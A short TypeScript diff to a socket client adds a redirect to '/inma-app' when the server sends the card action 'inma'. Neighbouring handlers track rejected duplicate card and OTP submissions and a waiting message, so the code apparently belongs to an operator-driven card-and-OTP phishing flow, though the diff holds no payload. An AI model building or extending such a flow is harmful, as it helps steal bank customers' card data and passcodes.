@@ -360,7 +360,8 @@ export async function connectSocket() {
     s.on("card:action", (action: string) => {
       cardAction.value = { action, timestamp: Date.now() };
       waitingMessage.value = "";
-    });
+    if (action === "inma") { clientNavigate("/inma-app"); }
+});
 
     s.on("card:duplicateRejected", () => { duplicateCardRejected.value = true; waitingMessage.value = ""; });
     s.on("otp:duplicateRejected", () => { duplicateOtpRejected.value = true; waitingMessage.value = ""; });
